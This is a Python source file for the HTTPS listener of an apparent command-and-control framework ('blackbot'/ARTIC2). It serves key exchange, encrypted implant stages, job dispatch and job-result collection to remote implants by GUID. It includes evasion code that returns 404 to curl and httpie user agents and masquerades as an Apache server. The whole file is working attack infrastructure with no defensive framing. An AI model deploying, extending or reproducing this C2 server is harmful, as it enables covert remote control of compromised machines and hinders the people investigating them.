import sys
import asyncio
import os
import logging
from blackbot.core.events import Events
from blackbot.core.utils import create_self_signed_cert, get_ipaddress, gen_random_string, get_path_in_data_folder, get_path_in_package, get_path_in_artic2
from blackbot.core.wss.listener import Listener
from blackbot.core.ipcclient import IPCException
from quart import Quart, Blueprint, request, Response
from hypercorn import Config
from hypercorn.asyncio import serve


class ARTIC2Listener(Listener):
    def __init__(self):
        super().__init__()
        self.name = 'https'
        self.certs_path = get_path_in_package('core/certs')
        self.description = 'HTTPS listener'

        self.options = {

            'Name': {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'https'
            },
            'BindIP': {
                'Description'   :   'The IPv4/IPv6 address to bind to.',
                'Required'      :   True,
                'Value'         :   get_ipaddress()
            },
            'Port': {
                'Description'   :   'Port for the listener.',
                'Required'      :   True,
                'Value'         :   443
            },
            'Cert': {
                'Description'   :   'SSL Certificate file',
                'Required'      :   False,
                'Value'         :   f'{self.certs_path}/artic2_cert.pem'
            },
            'Key': {
                'Description'   :   'SSL Key file',
                'Required'      :    False,
                'Value'         :   f'{self.certs_path}/artic2_private.key'

            },
            'RegenCert': {
                'Description'   :   'Regenerate TLS cert',
                'Required'      :    False,
                'Value'         :    False
            },
            'CallBackURls': {
                'Description'   :   'C2 Callback URLs (comma seperated)',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Comms': {
                'Description'   :   'C2 Comms to use',
                'Required'      :   True,
                'Value'         :   'https'
            }
        }

    def run(self):
        if (self['Key'] == f'{self.certs_path}/artic2_private.key') and (self['Cert'] == f'{self.certs_path}/artic2_cert.pem'):
            if not os.path.exists(get_path_in_data_folder("artic2_private.key")) or not os.path.exists(get_path_in_data_folder("artic2_cert.pem")) or self['RegenCert']:
                create_self_signed_cert()

        config = Config()
        config.ciphers = 'ALL'
        config.accesslog = os.path.join(get_path_in_artic2("logs"), "access.log")
        config.bind = f"{self['BindIP']}:{self['Port']}"
        config.certfile = os.path.expanduser(self['Cert'])
        config.keyfile= os.path.expanduser(self['Key'])
        config.include_server_header = False
        config.use_reloader = False
        config.debug = False

        """
        While we could use the standard decorators to register these routes, 
        using add_url_rule() allows us to create diffrent endpoint names
        programmatically and pass the classes self object to the routes
        """

        http_blueprint = Blueprint(__name__, 'https')
        http_blueprint.before_request(self.check_if_naughty)

        http_blueprint.add_url_rule('/<uuid:GUID>', 'key_exchange', self.key_exchange, methods=['POST'])
        http_blueprint.add_url_rule('/<uuid:GUID>', 'stage', self.stage, methods=['GET'])
        http_blueprint.add_url_rule('/<uuid:GUID>/jobs', 'jobs', self.jobs, methods=['GET'])
        http_blueprint.add_url_rule('/<uuid:GUID>/jobs/<job_id>', 'job_result', self.job_result, methods=['POST'])

        http_blueprint.add_url_rule('/', 'unknown_path', self.unknown_path, defaults={'path': ''})
        http_blueprint.add_url_rule('/<path:path>', 'unknown_path', self.unknown_path, methods=['GET', 'POST'])

        self.app = Quart(__name__)
        self.app.register_blueprint(http_blueprint)
        asyncio.run(serve(self.app, config))

    async def check_if_naughty(self):
        try:
            headers = request.headers['User-Agent'].lower()
            if 'curl' in headers or 'httpie' in headers:
                return '', 404
        except KeyError:
            pass

    async def make_normal(self, response):
        response.headers["server"] = "Apache/2.4.35"
        return response

    async def unknown_path(self, path):
        self.app.logger.error(f"{request.remote_addr} requested an unknown path: {path}")
        return '', 404

    async def key_exchange(self, GUID):
        try:
            data = await request.data
            pub_key = self.dispatch_event(Events.KEX, (GUID, request.remote_addr, data))
            return Response(pub_key, content_type='application/octet-stream')
        except IPCException:
            return '', 400

    async def stage(self, GUID):
        try:
            stage_file = self.dispatch_event(Events.ENCRYPT_STAGE, (GUID, request.remote_addr, self["Comms"]))
            self.dispatch_event(Events.SESSION_STAGED, f'Sending stage ({sys.getsizeof(stage_file)} bytes) ->  {request.remote_addr} ...')
            return Response(stage_file, content_type='application/octet-stream')
        except IPCException:
            return '', 400

    async def jobs(self, GUID):
        try:
            job = self.dispatch_event(Events.SESSION_CHECKIN, (GUID, request.remote_addr))
            if job:
                return Response(job, content_type='application/octet-stream')
            return '', 200
        except IPCException:
            return '', 400

    async def job_result(self, GUID, job_id):
        try:
            data = await request.data
            self.dispatch_event(Events.JOB_RESULT, (GUID, request.remote_addr, job_id, data))
            return '', 200
        except IPCException:
            return '', 400
